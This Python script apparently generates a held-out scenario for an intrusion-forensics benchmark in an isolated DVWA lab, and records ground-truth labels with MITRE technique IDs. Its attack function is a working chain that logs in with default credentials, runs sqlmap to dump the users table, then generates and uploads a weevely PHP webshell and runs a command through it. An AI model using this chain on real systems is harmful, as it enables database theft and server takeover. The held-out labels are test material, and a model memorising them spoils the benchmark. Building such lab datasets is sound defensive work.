"""Record the isolated DVWA SQLi-to-authenticated-upload held-out scenario."""

from __future__ import annotations

import json
import os
import socket
import subprocess
import sys
import tempfile
import time
from datetime import UTC, datetime
from pathlib import Path

import requests

sys.path.insert(0, "/opt/v2")

EDGE = "http://edge"
ATTACKER_IP = "192.0.2.131"
AGENT_PASSWORD = os.environ["BENCH_AGENT_PASSWORD"]


def timestamp() -> str:
    return datetime.now(UTC).isoformat(timespec="microseconds")


def isolation() -> None:
    from background import target_url

    try:
        target_url("/", "outside-lab")
    except ValueError:
        print("non_allowlisted_service_refused=PASS")
    else:
        raise SystemExit("non_allowlisted_service_refused=FAIL")
    try:
        with socket.create_connection(("1.1.1.1", 443), timeout=2):
            raise SystemExit("external_address_unreachable=FAIL")
    except OSError:
        print("external_address_unreachable=PASS")


def attack() -> None:
    ready = Path("/replay/background-halfway")
    continuation = Path("/replay/background-continue")
    for _ in range(180000):
        if ready.exists():
            break
        time.sleep(0.05)
    else:
        raise TimeoutError("background replay did not reach its seeded pause")

    from pacing import install_hand_pacing

    install_hand_pacing(5002, scanner=False)

    headers = {"X-Lab-Client-IP": ATTACKER_IP, "User-Agent": "M8-v2-s02-sqlmap"}
    session = requests.Session()
    from s05 import Inputs

    login_page = session.get(f"{EDGE}/login.php", headers=headers, timeout=15)
    login_fields = Inputs()
    login_fields.feed(login_page.text)
    login = session.post(
        f"{EDGE}/login.php",
        headers={**headers, "X-Lab-Step": "administrator_login"},
        data={
            "username": os.environ.get("DVWA_ADMIN_USER", "admin"),
            "password": os.environ.get("DVWA_ADMIN_PASSWORD", "password"),
            "Login": "Login",
            "user_token": login_fields.values.get("user_token", ""),
        },
        timeout=15,
        allow_redirects=True,
    )
    if login.status_code != 200 or 'name="username"' in login.text:
        raise RuntimeError("DVWA administrator login failed")

    security = session.get(f"{EDGE}/security.php", headers=headers, timeout=15)

    fields = Inputs()
    fields.feed(security.text)
    lowered = session.post(
        f"{EDGE}/security.php",
        headers={**headers, "X-Lab-Step": "security_level_low"},
        data={
            "security": "low",
            "seclev_submit": "Submit",
            "user_token": fields.values.get("user_token", ""),
        },
        timeout=15,
        allow_redirects=False,
    )
    if lowered.status_code not in {200, 302} or session.cookies.get("security") != "low":
        raise RuntimeError("DVWA low security setting could not be selected")

    cookie = "; ".join(f"{item.name}={item.value}" for item in session.cookies)
    started = timestamp()
    with tempfile.TemporaryDirectory(prefix="s02-sqlmap-") as temporary:
        traffic = Path(temporary) / "traffic.txt"
        output_dir = Path(temporary) / "output"
        sqlmap = subprocess.run(
            [
                "python",
                "/opt/sqlmap/sqlmap.py",
                "-u",
                f"{EDGE}/vulnerabilities/sqli/?id=1&Submit=Submit",
                "--cookie",
                cookie,
                "--batch",
                "--flush-session",
                "--level=1",
                "--risk=1",
                "--technique=E",
                "--dbms=MySQL",
                "-D",
                "dvwa",
                "-T",
                "users",
                "--dump",
                "--threads=1",
                "--retries=0",
                "--timeout=1",
                "-t",
                str(traffic),
                "--output-dir",
                str(output_dir),
                "--headers",
                f"X-Lab-Client-IP: {ATTACKER_IP}\nUser-Agent: M8-v2-s02-sqlmap",
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=150,
            check=False,
        )
        sqlmap_text = sqlmap.stdout.lower()
        dump_files = list(output_dir.rglob("users.csv"))
        dump_ok = bool(dump_files)
        injection_confirmed = "injectable" in sqlmap_text and "parameter" in sqlmap_text
        if sqlmap.returncode != 0 or not injection_confirmed:
            summary = [
                line.strip()
                for line in sqlmap.stdout.splitlines()
                if any(
                    word in line.lower()
                    for word in ("vulnerable", "dumped", "fetched", "error")
                )
            ][-8:]
            Path("/replay/s02-sqlmap-summary.json").write_text(
                json.dumps({"exit_code": sqlmap.returncode, "summary": summary}, indent=2) + "\n",
                encoding="utf-8",
            )
            raise RuntimeError(f"sqlmap user-table dump did not verify: {summary}")
        Path("/replay/s02-sqlmap-summary.json").write_text(
            json.dumps(
                {
                    "exit_code": sqlmap.returncode,
                    "injection_confirmed": injection_confirmed,
                    "user_table_dump_confirmed": dump_ok,
                    "output_paths": [
                        path.relative_to(output_dir).as_posix() for path in dump_files
                    ],
                },
                indent=2,
            )
            + "\n",
            encoding="utf-8",
        )
        traffic_text = traffic.read_text(encoding="utf-8", errors="replace")
        first_request = next(
            (line for line in traffic_text.splitlines() if "GET /vulnerabilities/sqli/" in line),
            'GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1',
        )
        started_for_step = started
        ended = timestamp()

    marker = Path("/tmp/m8v2-s02-agent.php")
    subprocess.run(
        ["weevely", "generate", AGENT_PASSWORD, str(marker)],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    upload_page = session.get(
        f"{EDGE}/vulnerabilities/upload/",
        headers={**headers, "X-Lab-Step": "upload_form"},
        timeout=60,
    )
    if upload_page.status_code != 200 or 'name="uploaded"' not in upload_page.text:
        raise RuntimeError("DVWA upload form did not load")
    with marker.open("rb") as shell_file:
        response = session.post(
            f"{EDGE}/vulnerabilities/upload/",
            headers={**headers, "X-Lab-Step": "agent_upload"},
            data={"MAX_FILE_SIZE": "100000", "Upload": "Upload"},
            files={"uploaded": ("m8v2-s02-agent.php", shell_file, "application/x-php")},
            timeout=30,
        )
    if response.status_code != 200 or "uploaded" not in response.text.lower():
        raise RuntimeError("DVWA rejected the isolated agent upload")
    agent_url = f"{EDGE}/hackable/uploads/m8v2-s02-agent.php"
    command = subprocess.run(
        ["weevely", agent_url, AGENT_PASSWORD, "id"],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        timeout=20,
    )
    if "www-data" not in command.stdout:
        raise RuntimeError("the isolated upload did not return the web service identity")

    records = {
        "scenario_id": "s02",
        "description": (
            "After the preconfigured DVWA administrator session is established, pinned "
            "sqlmap confirms SQL injection and attempts a user-table dump; the same session "
            "uploads and briefly verifies an agent. The SQLi is not represented as the cause "
            "of the login because this DVWA module requires authentication."
        ),
        "attacker_ips": [ATTACKER_IP],
        "root_cause_step": "agent_upload",
        "steps": [
            {
                "id": "sqlmap_injection_check",
                "category": "sql_injection",
                "mitre": ["T1190"],
                "label_method": "attacker_ip_time_window",
                "attacker_ip": ATTACKER_IP,
                "started_at": started_for_step,
                "ended_at": ended,
                "request": first_request,
                "status": 200,
                "candidate_ordinal": 1,
            },
            {
                "id": "administrator_login",
                "category": "valid_account_access",
                "mitre": ["T1078"],
                "label_method": "header",
            },
            {
                "id": "security_level_low",
                "category": "valid_account_access",
                "mitre": ["T1078"],
                "label_method": "header",
            },
            {
                "id": "upload_form",
                "category": "reconnaissance",
                "mitre": ["T1595"],
                "label_method": "header",
                "expected_in_timeline": False,
            },
            {
                "id": "agent_upload",
                "category": "file_upload",
                "mitre": ["T1505.003"],
                "label_method": "header",
            },
        ],
        "files": [
            {"path": "/hackable/uploads/m8v2-s02-agent.php", "role": "webshell_agent"},
            {
                "path": "/hackable/uploads/.htaccess",
                "role": "side_effect",
                "expected_in_report": False,
            },
        ],
        "analysis": {
            "access_logs": ["access.log.gz"],
            "error_logs": ["app-error.log"],
            "error_log_format": "apache",
            "error_log_utc_offset": "+0000",
            "manifest": "manifest.tsv",
            "baseline": "baseline.tsv",
            "trusted_proxies": [],
        },
        "split": "held_out",
        "expected_rule_ids": [],
    }
    Path("/replay/records.json").write_text(
        json.dumps(records, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
    )
    continuation.write_text("continue\n", encoding="ascii")
    print(json.dumps({"sqlmap_dump_confirmed": dump_ok, "agent_command_confirmed": True}))


if __name__ == "__main__":
    {"isolation": isolation, "attack": attack}[sys.argv[1]]()
